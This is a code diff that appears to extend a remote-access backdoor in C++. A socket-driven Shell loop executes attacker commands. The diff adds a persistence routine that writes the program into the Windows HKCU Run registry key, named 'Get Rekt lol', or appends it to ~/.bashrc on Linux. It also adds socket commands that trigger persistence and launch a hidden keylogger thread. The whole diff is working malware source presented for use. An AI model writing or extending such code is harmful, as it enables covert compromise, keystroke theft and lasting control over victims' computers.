@@ -3,18 +3,65 @@
 #include <cstring>
 #include <sys/stat.h>
 #include <sys/types.h>
+#include <fstream>
+#include <limits.h>
+#include <thread>
 
 #ifdef _WIN32
 #include <winsock2.h>
 #include <windows.h>
 #include <ws2tcpip.h>
+#include "logger.cpp"
 #pragma comment(lib, "ws2_32.lib")
 #else
 #include <unistd.h>
 #include <arpa/inet.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
+#include <X11/Xlib.h>
+#include <X11/keysym.h>
+#include <X11/XKBlib.h>
 #endif
+
+int createPersistence(int sock)
+{
+
+#ifdef _WIN32
+    TCHAR path[PATH_MAX];
+    HKEY hKey;
+    DWORD pathLen = GetModuleFileName(NULL, path, PATH_MAX);
+
+    if (pathLen == 0 || RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &hKey) != ERROR_SUCCESS)
+    {
+        return -1;
+    }
+
+    DWORD pathLenInBytes = pathLen * sizeof(path);
+    if (RegSetValueEx(hKey, TEXT("Get Rekt lol"), 0, REG_SZ, (LPBYTE)path, pathLenInBytes) != ERROR_SUCCESS)
+    {
+        return -1;
+    }
+
+    RegCloseKey(hKey);
+    send(sock, "Persistence added", 17, 0);
+#else
+    char path[PATH_MAX];
+    ssize_t pathLen = readlink("/proc/self/exe", path, sizeof(path) - 1);
+    if (pathLen <= 0)
+    {
+        return -1;
+    }
+
+    path[pathLen] = '\0';
+    std::string cmd = "echo \"";
+    cmd += path;
+    cmd += "\" >> ~/.bashrc";
+    system(cmd.c_str());
+    send(sock, "Persistence added", 17, 0);
+#endif
+
+    return 0;
+}
 
 void Shell(int sock)
 {
@@ -24,6 +71,7 @@ void Shell(int sock)
 
     while (true)
     {
+    jump:
         buf[0] = '\0';
         server_message[0] = '\0';
         total_response[0] = '\0';
@@ -41,6 +89,21 @@ void Shell(int sock)
             exit(2);
         }
 
+        else if (strcmp(buf, "getRekt.jpg") == 0)
+        {
+            createPersistence(sock);
+        }
+
+        else if (strcmp(buf, "keylog") == 0)
+        {
+#ifdef _WIN32
+            std::thread keylogger_thread(keylogger, "log.txt", 1);
+            keylogger_thread.detach();
+            goto jump;
+#else
+            send(sock, "Keylogger not supported on Linux", 32, 0);
+#endif
+        }
         else if (strncmp("cd ", buf, 3) == 0)
         {
             chdir(buf + 3);
